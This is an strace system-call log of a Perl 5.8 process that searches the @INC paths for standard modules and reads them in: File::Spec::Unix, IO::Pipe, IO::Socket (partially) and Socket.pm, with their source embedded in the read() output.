12010 20:22:35.448457 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
12010 20:22:35.449148 brk(0x8218000)    = 0x8218000
12010 20:22:35.449337 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
12010 20:22:35.449741 read(8, "", 4096) = 0
12010 20:22:35.449757 close(8)          = 0
12010 20:22:35.450016 read(6, "", 4096) = 0
12010 20:22:35.450033 close(6)          = 0
12010 20:22:35.450210 stat64("/etc/perl/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450227 stat64("/etc/perl/IO/Pipe.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450242 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450256 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450280 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450323 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450354 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450380 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450394 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450406 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450420 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.450434 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
12010 20:22:35.450457 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.450473 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.450485 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.450507 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
12010 20:22:35.451243 _llseek(6, 3425, [3425], SEEK_SET) = 0
12010 20:22:35.451262 _llseek(6, 0, [3425], SEEK_CUR) = 0
12010 20:22:35.451284 close(6)          = 0
12010 20:22:35.451337 stat64("/etc/perl/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451367 stat64("/etc/perl/IO/Socket.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451381 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451395 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451409 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451423 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451437 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451449 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451463 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451475 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfc7a0dc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451489 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfc7a1cc) = -1 ENOENT (No such file or directory)
12010 20:22:35.451502 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
12010 20:22:35.451524 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
12010 20:22:35.451539 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79ee8) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.451551 _llseek(6, 0, [0], SEEK_CUR) = 0
12010 20:22:35.451568 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
12010 20:22:35.451945 stat64("/etc/perl/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.451964 stat64("/etc/perl/Socket.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.451978 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.451991 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452006 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452018 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452033 stat64("/usr/lib/perl5/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452045 stat64("/usr/lib/perl5/Socket.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452059 stat64("/usr/share/perl5/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452071 stat64("/usr/share/perl5/Socket.pm", 0xbfc79c2c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452084 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfc79d1c) = -1 ENOENT (No such file or directory)
12010 20:22:35.452097 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
12010 20:22:35.452118 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
12010 20:22:35.452132 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc79a38) = -1 ENOTTY (Inappropriate ioctl for device)
12010 20:22:35.452144 _llseek(8, 0, [0], SEEK_CUR) = 0
12010 20:22:35.452162 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
12010 20:22:35.452357 brk(0x8239000)    = 0x8239000
12010 20:22:35.452622 read(8, "", 4096) = 0
12010 20:22:35.452638 close(8)          = 0
12010 20:22:35.452728 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
12010 20:22:35.452754 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
12010 20:22:35.452784 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
